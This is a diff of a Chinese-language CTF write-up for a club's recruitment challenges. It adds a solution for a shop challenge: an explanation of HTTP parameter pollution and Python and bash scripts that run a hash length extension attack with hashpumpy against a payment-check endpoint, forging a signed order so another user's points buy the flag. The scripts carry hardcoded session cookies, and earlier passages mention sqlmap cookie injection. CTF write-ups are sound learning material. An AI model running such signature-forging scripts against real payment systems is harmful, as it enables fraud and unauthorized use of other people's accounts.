@@ -74,8 +74,6 @@ Content-Type: application/x-www-form-urlencoded
 action=readflag
 ```
 
-满足以下全部条件就能获得 raccoon{da952ba50ee4eecf7ac79cf49ec6669e}	
-
 
 
 ### Javascript Tricks
@@ -125,8 +123,6 @@ PORT = 8082
 
 server.listen(PORT, HOST); 
 ```
-
-有人说这是一道密码学的题，我觉得很有道理，哈哈。
 
 初步思路：把 data 暴力跑出来，再 nc 提交一下
 
@@ -315,9 +311,7 @@ foreach ($_POST as $key => $value) {
 }
 ```
 
-但是这玩意就算有注入也不太好玩呀？？注入什么才会显示 flag 呢？这是一个问题 [常用手工注入语句](https://blog.csdn.net/wizardforcel/article/details/59480461)
-
-后面又发现 `uesr_id` 可以注入，最终在 `login.php` 中找到 `user_id` 的来源，就是数据库中的键。
+后来发现 `uesr_id` 可以注入，最终在 `login.php` 中找到 `user_id` 的来源，就是数据库中的键。
 
 ```php
 // index.php
@@ -333,7 +327,7 @@ $_SESSION['username'] = $a['username'];  // 在这里
 $_SESSION['user_id'] = $a['id'];		 // 手动高亮
 ```
 
-询问朋友得知可以 cookie 注入，突然又有了新思路，手工注入又不太会，先跑跑 sqlmap 试试。[参考博客](https://blog.csdn.net/u011781521/article/details/58135307)
+GET、POST都被直接过滤了，试试 cookie 注入，手工注入不太会，先跑跑 sqlmap 试试。[参考博客](https://blog.csdn.net/u011781521/article/details/58135307)
 
 ```shell
 # 1.cookie 注入，猜解表
@@ -379,7 +373,189 @@ Table: flag
 # 至此，flag 已经成功获得，第一次成功用sqlmap跑出来还是蛮激动的，哈哈哈，爽~
 ```
 
+==手注版==(吴乾豪提供)  以后再整理一下
+
+![IQMRDL4](C:\Users\LegnaVI\Documents\Tencent Files\1095184193\FileRecv\IQMRDL4.png)
+
+![STNGU9DPB2](C:\Users\LegnaVI\Documents\Tencent Files\1095184193\FileRecv\STNGU9DPB2.png)
+
+![1542284390673](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542284390673.png)
+
 
 
 ### 咕咕 shop
 
+听说 [咕咕shop](http://118.89.198.146:50006/) 上有个积分上万的人，你能越权消耗他的积分，购买到 FLAG 吗？
+
++   哈希长度扩展攻击    [相关工具](https://www.cnblogs.com/pcat/p/5478509.html)  [参考博客](http://www.cnblogs.com/pcat/p/7668989.html)  [Hashpumpy](https://github.com/bwall/HashPump)
+
++   HTTP参数污染
+
+HTTP参数污染，简单地讲就是给一个参数赋上两个或两个以上的值。现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理。因此web程序组件在遇到这类问题时采取的方法也不完全相同。在一个HTTP请求中，同一个参数，拥有多个值是合法的。利用此特性，可以作为绕过参数过滤的手段。
+
+假设这个URL：http://www.xxxx.com/search.php?id=110&id=911
+
+百度会理解成让百度搜索：110                 #选择了第一个参数,放弃了第二个参数。
+
+雅虎会理解成让雅虎搜索：911　　          #选择了第二个参数,放弃了第一个参数。
+
+谷歌会理解成让谷歌搜索：110 911         #两个参数同时选择。
+
+假设输入 ?key=select & key=1,2,3,4 from table
+
+服务端有可能会将key处理为select 1,2,3,4 from table，从而导致SQL注入。
+
+![1542278011170](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542278011170.png)
+
+战线拉得太长，很多东西都快忘了，赶紧写下wp巩固下
+
+<u>记录下几个关键点：</u>
+
+具体服务端处理方式如下：
+
+1.利用哈希长度扩展攻击跑出密钥长度
+
+2.利用 HPP 实现越权“购买”
+
+
+
+==shell版==：第一想法是先生成字典，然后放到bp里跑，结果失败了
+
+```shell
+#!/bin/bash
+
+signature="422f15413110908ab58d837ae3b2f28f"
+data="order_id=156&buyer_id=39&good_id=25&buyer_point=510&good_price=10&order_create_time=1542048947.212575"
+key_len=900  # yizhimiyao
+#add_data="&good_id=42&buyer_point=999999"
+add_data="&a"
+#add_data="&good_id=42"
+#add_data="&a=2"
+mabye="buyer_point=999999"
+
+for ((len=0; i<350; i++,key_len++))
+do
+	hashpump -s $signature -d $data -k $key_len -a $add_data
+done
+```
+
+```shell
+#!/bin/bash
+bash _shell > len.txt
+awk 'NR%2==0' len.txt > post.txt  # 输出偶数行
+awk 'NR%2==1' len.txt > sign.txt  # 输出奇数行
+```
+
+
+
+==py版==：还是py给力，以后全用py吧
+
+先post一个无关的值。如果签名没错，即秘钥长度正确，post一个无关的值，仍然会购买成功
+
+```python
+import hashpumpy
+import urllib
+import requests
+import json
+
+for i in range(500):
+	signature = '579e444c268e0d907802313318cdfcb2'
+	original = 'order_id=160&buyer_id=39&good_id=25&buyer_point=500&good_price=10&order_create_time=1542226400.115264'
+	add_data = '&a=233'
+	key_length = len(original) + 700 + i
+
+	hash = hashpumpy.hashpump(signature,original,add_data,key_length)
+
+	url = 'http://118.89.198.146:50006/paymentGatewayV2/cid-1145141919/810893/check.jsp?signature='
+	
+	# message = urllib.quote(urllib.unquote(hash[1]))  不需要编码为URL
+	message = hash[1]
+    print i,hash[0]
+        
+	url += hash[0]
+        print url
+	
+	headers={
+        'Content-Type': 'application/x-www-form-urlencoded',
+		'cookie': 'csrftoken=9wFi4GbKQdcis91qJP28DEmZZerQXdqBWt53kHmwUNp1iEFVnEVEVFmYuX5eBKUG; JSESSIONID=buakhmracrlqcyxt726ui8u5jymu0ov4',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+		'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+		'Accept-Encoding': 'gzip, deflate'
+	}
+
+	#res = requests.post(url=url,headers=headers,data=message,proxies={'http': '127.0.0.1:8080'})
+	res = requests.post(url=url,headers=headers,data=message)
+
+    if 'alert alert-dange' not in res.content:
+       print key_length;
+       break
+```
+
+![1542281973455](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542281973455.png)
+
+得到长度后，就是参数污染了。直接添加`good_id=42`失败了，否则就太简单了，换了不少姿势。
+
+后面突然想到，题面的信息：有个积分上万的人，你能越权消耗他的积分，购买到 FLAG 吗？
+
+==划重点==  用别人的钱买flag  ==划重点==
+
+然后就是换`buyer_id`，第一反应是 1, 0 ? 不，还是失败了，直接挂个脚本尝试下？31，购买成功！
+
+期间遇到的麻烦：页面找不到。最初以为是自己误删了某个信息，重新复制一下仍然报错，纠结了好久。
+
+
+
+```python
+import hashpumpy
+import urllib
+import requests
+
+signature = '7d542ad0766a6459e6048ed854091987'
+original = 'order_id=162&buyer_id=39&good_id=33&buyer_point=480&good_price=300&order_create_time=1542231522.790944'
+#add_data = '&good_id=42'
+#add_data = '&buyer_id=0'
+#add_data = '&buyer_id=1&good_id=42'
+#add_data = '&good_id=42&good_id=42'
+#add_data = '&good_id=42&buyer_point=999'
+#add_data = '&good_id=42&buyer_point=999&good_price=998'
+#add_data = '&buyer_point=999&good_id=42&good_price=998'
+key_length = 1024
+headers={
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'cookie': 'csrftoken=9wFi4GbKQdcis91qJP28DEmZZerQXdqBWt53kHmwUNp1iEFVnEVEVFmYuX5eBKUG; JSESSIONID=buakhmracrlqcyxt726ui8u5jymu0ov4',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+        'Accept-Encoding': 'gzip, deflate'
+}
+
+    
+i = 31
+add_data = '&good_id=42&buyer_id=' + str(i)
+# i = 31 who have money to buy flag
+hash = hashpumpy.hashpump(signature,original,add_data,key_length)
+url = 'http://118.89.198.146:50006/paymentGatewayV2/cid-1145141919/810893/check.jsp?signature=' + hash[0]
+# message = urllib.quote(urllib.unquote(hash[1]))
+message = hash[1]
+
+# proxy={'http': '127.0.0.1:8080'}  设置代理
+# 如果不确定request发的具体数据，用bp看看(剑涛老哥教的)
+
+#res = requests.post(url=url,headers=headers,data=message,proxies=proxy)
+res = requests.post(url=url,headers=headers,data=message)
+
+print res.content
+if 'alert alert-success' in res.content:
+    print "-------------------------Success!------------------------"
+```
+
+![1542281916199](C:\Users\LegnaVI\AppData\Roaming\Typora\typora-user-images\1542281916199.png)
+
+到此，flag 已经买到了。当时候还没反应过来，想着再买一次，去看一下订单，flag已经出来。 
+
+
+
+**Raccoon 的纳新题就全做完了，也顺利进入了ROIS的考核队列。**
+
+**小目标成功实现，也对得起这几天疯狂做web题了。**
